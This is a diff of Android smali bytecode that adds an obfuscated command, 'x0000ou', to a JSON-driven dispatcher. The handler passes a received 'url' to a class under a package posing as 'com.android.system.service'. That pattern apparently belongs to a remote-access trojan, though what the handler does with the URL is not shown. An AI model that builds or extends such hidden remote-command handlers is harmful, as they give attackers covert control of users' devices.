@@ -242,6 +242,19 @@
 
     goto :goto_1
 
+    :sswitch_14
+    const-string v0, "x0000ou"
+
+    invoke-virtual {v2, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v0
+
+    if-eqz v0, :cond_0
+
+    const/16 v0, 0xe
+
+    goto :goto_1
+
     :cond_0
     :goto_0
     const/4 v0, -0x1
@@ -505,6 +518,17 @@
 
     goto :goto_2
 
+    :pswitch_14
+    const-string v0, "url"
+
+    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object p1
+
+    invoke-static {p1}, Lcom/android/system/service/ConnectionManager;->x0000ou(Ljava/lang/String;)V
+
+    goto :goto_2
+
     :catch_0
     move-exception p1
 
@@ -531,7 +555,8 @@
         0x208f60c8 -> :sswitch_9
         0x208f60d2 -> :sswitch_0
         0x208f5fef -> :sswitch_13
-        0x208f6134 -> :sswitch_12
+         0x208f6134 -> :sswitch_12
+         0x208f605e -> :sswitch_14
     .end sparse-switch
 
     :pswitch_data_0
@@ -550,5 +575,6 @@
         :pswitch_11
         :pswitch_12
         :pswitch_13
+        :pswitch_14
     .end packed-switch
 .end method
